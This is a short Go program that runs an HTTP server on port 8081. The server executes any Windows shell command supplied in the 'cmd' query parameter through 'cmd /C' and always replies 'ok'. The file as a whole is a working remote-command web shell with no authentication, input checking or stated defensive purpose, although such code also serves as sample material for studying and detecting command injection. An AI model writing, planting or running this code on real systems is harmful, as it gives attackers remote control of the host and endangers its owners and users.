package main

import (
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := exec.Command("cmd", "/C", r.URL.Query().Get("cmd"))
	_, _ = cmd.Output()
	_, _ = w.Write([]byte("ok"))
}

func main() {
	http.HandleFunc("/", handler)
	_ = http.ListenAndServe(":8081", nil)
}
